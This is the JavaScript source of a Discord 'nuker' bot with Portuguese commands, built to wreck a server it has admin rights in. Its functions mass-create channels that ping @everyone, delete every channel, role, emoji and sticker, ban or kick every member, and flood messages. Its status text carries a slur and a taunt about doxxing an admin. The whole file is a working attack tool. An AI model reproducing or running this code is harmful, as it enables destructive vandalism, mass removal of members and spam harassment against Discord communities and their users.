
const { Client, Intents, MessageEmbed } = require("discord.js");
const nuker = new Client({ intents: Object.values(Intents.FLAGS).reduce((a, b) => a + b) });
const { red, greenBright } = require("chalk");
const { token, prefix, userID, disableEveryone } = require("../config/config.json")

nuker.on("ready", () => {
    console.clear();
    console.log(red(`

 /$$   /$$ /$$$$$$$$ /$$    /$$ /$$$$$$$$ /$$$$$$$  /$$        /$$$$$$  /$$   /$$ /$$$$$$$ 
| $$$ | $$| $$_____/| $$   | $$| $$_____/| $$__  $$| $$       /$$__  $$| $$$ | $$| $$__  $$
| $$$$| $$| $$      | $$   | $$| $$      | $$  \\ $$| $$      | $$  \\ $$| $$$$| $$| $$  \\ $$
| $$ $$ $$| $$$$$   |  $$ / $$/| $$$$$   | $$$$$$$/| $$      | $$$$$$$$| $$ $$ $$| $$  | $$
| $$  $$$$| $$__/    \\  $$ $$/ | $$__/   | $$__  $$| $$      | $$__  $$| $$  $$$$| $$  | $$
| $$\\  $$$| $$        \\  $$$/  | $$      | $$  \\ $$| $$      | $$  | $$| $$\\  $$$| $$  | $$
| $$ \\  $$| $$$$$$$$   \\  $/   | $$$$$$$$| $$  | $$| $$$$$$$$| $$  | $$| $$ \\  $$| $$$$$$$/
|__/  \\__/|________/    \\_/    |________/|__/  |__/|________/|__/  |__/|__/  \\__/|_______/ 
                                                                                           
                                                                                           
    `))
    nuker.user.setActivity({ name: "RODANDO PANELEIRO", type: "ADMIN FOI DOXXADO" });
});

nuker.on("messageCreate", (message) => {

    // Help Embed
    const help = new MessageEmbed()
        .setDescription(`**Presser Beta ;**
    \n**criar canais ;**
    ${prefix}ny [amount] (text)\n
    **criar canais + ping @everyone ;**
    ${prefix}nv [amount] (text), {message}\n
    **deletar canais ;**
    ${prefix}nd\n
    **criar cargos ;**
    ${prefix}nc [amount] (text)\n
    **deletar cargos ;**
    ${prefix}ndc\n
    **deletar emojis ;**
    ${prefix}nde\n
    **deletar stickers ;**
    ${prefix}nds\n
    **expulsar todos ;**
    ${prefix}nkick\n
    **banir todos ;**
    ${prefix}nban\n
    **flood de mensagens ;**
    ${prefix}nm [amount] (message)\n
    `)
        .setFooter(`© Presser Beta`)
        .setColor(0x36393E)
        .setTimestamp(Date.now());

    // Perms
    const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
    const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
    const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");

    // Args
    let args = message.content.split(" ").slice(1);
    var args1 = args[0];
    var args2 = args.slice(1).join(' ')
    var args3 = args.slice(2).join(', ');

    if (!disableEveryone || message.author.id === userID) {
        if (message.content.startsWith(prefix + "help")) {
            message.channel.send({embeds: [help]})
        }

        if (message.content.startsWith(prefix + "ny")) {
            MassChannels(args1, args2).catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nd")) {
            DelAllChannels().catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nv")) {
            MassChnPing(args1, args2, args3).catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nc")) {
            MassRoles(args1, args2).catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "ndc")) {
            DelAllRoles().catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nds")) {
            DelAllStickers().catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nde")) {
            DelAllEmotes().catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nban")) {
            BanAll().catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nkick")) {
            KickAll().catch((err) => message.reply(err));
        }

        if (message.content.startsWith(prefix + "nm")) {
            FloodMessages(args1, args2).catch((err) => message.reply(err));
        }
    }

    // --- FUNÇÕES ---

    async function MassChannels(amount, channelName) {
        if (!amount) throw "Informe a quantidade";
        if (isNaN(amount)) throw "Use um número válido";
        if (amount > 500) throw "Máximo 500 canais";
        if (!channelPerms) throw "Sem permissão: MANAGE_CHANNELS";

        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size >= 500) break;
            try {
                await message.guild.channels.create(
                    channelName || `${message.author.username} was here`,
                    { type: "GUILD_TEXT" }
                );
            } catch (err) {
                console.log(red("Erro: " + err));
            }
        }
    }

    async function MassChnPing(amount, channelName, pingMessage) {
        if (!amount) throw "Informe a quantidade";
        if (isNaN(amount)) throw "Use um número válido";
        if (amount > 500) throw "Máximo 500 canais";
        if (!channelPerms) throw "Sem permissão: MANAGE_CHANNELS";
        if (!pingMessage) throw "Informe a mensagem";

        for (let i = 0; i < amount; i++) {
            if (message.guild.channels.cache.size >= 500) break;
            try {
                const ch = await message.guild.channels.create(
                    channelName || `${message.author.username} was here`,
                    { type: "GUILD_TEXT" }
                );

                setTimeout(() => {
                    ch.send("@everyone " + pingMessage)
                      .catch((err) => console.log(red("Erro: " + err)));
                }, 500 * i);

            } catch (err) {
                console.log(red("Erro: " + err));
            }
        }
    }

    async function DelAllChannels() {
        if (!channelPerms) throw "Sem permissão: MANAGE_CHANNELS";
        for (const ch of message.guild.channels.cache.values()) {
            try { await ch.delete(); }
            catch (err) { console.log(red("Erro: " + err)); }
        }
    }

    async function MassRoles(amount, roleName) {
        if (!amount) throw "Informe a quantidade";
        if (isNaN(amount)) throw "Use um número válido";
        if (!rolePerms) throw "Sem permissão: MANAGE_ROLES";

        for (let i = 0; i < amount; i++) {
            if (message.guild.roles.cache.size >= 250) break;
            try {
                await message.guild.roles.create({
                    name: roleName || "nuked",
                    color: "RANDOM",
                    position: i
                });
            } catch (err) {
                console.log(red("Erro: " + err));
            }
        }
    }

    async function DelAllRoles() {
        if (!rolePerms) throw "Sem permissão: MANAGE_ROLES";
        for (const r of message.guild.roles.cache.values()) {
            try { await r.delete(); }
            catch (err) { console.log(red("Erro: " + err)); }
        }
    }

    async function DelAllEmotes() {
        if (!emotePerms) throw "Sem permissão: MANAGE_EMOJIS_AND_STICKERS";
        for (const e of message.guild.emojis.cache.values()) {
            try { await e.delete(); }
            catch (err) { console.log(red("Erro: " + err)); }
        }
    }

    async function DelAllStickers() {
        if (!emotePerms) throw "Sem permissão: MANAGE_EMOJIS_AND_STICKERS";
        for (const s of message.guild.stickers.cache.values()) {
            try { await s.delete(); }
            catch (err) { console.log(red("Erro: " + err)); }
        }
    }

    async function BanAll() {
        if (!banPerms) throw "Sem permissão: BAN_MEMBERS";
        const members = message.guild.members.cache;
        message.reply("Encontrados " + members.size + " usuários. Banindo...");

        for (const m of members.values()) {
            try {
                await m.ban();
                console.log(greenBright(`${m.user.tag} foi banido.`));
            } catch (err) {
                console.log(red("Erro: " + err));
            }
        }
    }

    async function KickAll() {
        if (!kickPerms) throw "Sem permissão: KICK_MEMBERS";
        const members = message.guild.members.cache;
        message.reply("Encontrados " + members.size + " usuários. Expulsando...");

        for (const m of members.values()) {
            try {
                await m.kick();
                console.log(greenBright(`${m.user.tag} foi expulso.`));
            } catch (err) {
                console.log(red("Erro: " + err));
            }
        }
    }

    function FloodMessages(amount, msg) {
        return new Promise((resolve, reject) => {
            if (!amount) return reject("Informe a quantidade");
            if (isNaN(amount)) return reject("Use um número válido");
            if (amount > 50) return reject("Máximo 50 mensagens");
            if (!msg) return reject("Informe a mensagem");

            let i = 0;
            const interval = setInterval(() => {
                if (i >= amount) {
                    clearInterval(interval);
                    return resolve();
                }
                message.channel.send(msg)
                  .catch((err) => console.log(red("Erro: " + err)));
                i++;
            }, 500);
        });
    }
});

try {
    nuker.login(token);
} catch (err) {
    console.error(err)
}
